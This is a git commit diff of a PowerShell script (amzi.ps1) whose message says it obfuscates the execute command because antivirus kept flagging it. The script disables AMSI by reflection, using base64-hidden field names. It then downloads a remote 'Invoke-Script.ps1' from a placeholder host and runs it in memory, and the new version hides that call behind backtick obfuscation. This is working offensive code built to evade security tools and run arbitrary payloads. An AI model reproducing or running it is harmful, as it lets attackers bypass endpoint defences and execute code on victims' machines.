df07f84e4fe21bc47ed35dc15e0aeaeddd1a51a7
0iphor13 <79219148+0iphor13@users.noreply.github.com>
2021-05-25 14:45:54 +0200

    Obfuscated IEX command
    Obfuscated code, because the old one got flagged everytime by AV.

--- amzi.ps1
+++ amzi.ps1
@@ -4,11 +4,11 @@
 
 Start-Sleep -s 3
 
-[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
+[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true);
 
-Start-Sleep -s 1
+Start-Sleep -s 2
 
-(New-Object Net.WebClient).DownloadString('http://0.0.0.0:8080/Invoke-Script.ps1') | & ( $eNV:ComSpeC[4,15,25]-JoIn'' )
+. ((${`E`x`e`c`u`T`i`o`N`C`o`N`T`e`x`T}."`I`N`V`o`k`e`C`o`m`m`A`N`d"). "`N`e`w`S`c`R`i`p`T`B`l`o`c`k"((& (`G`C`M *w-O*) "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"('ht'+'tp://0.0.0.0:8080/Invoke-Script.ps1')))
 
 Start-Sleep -s 20
 
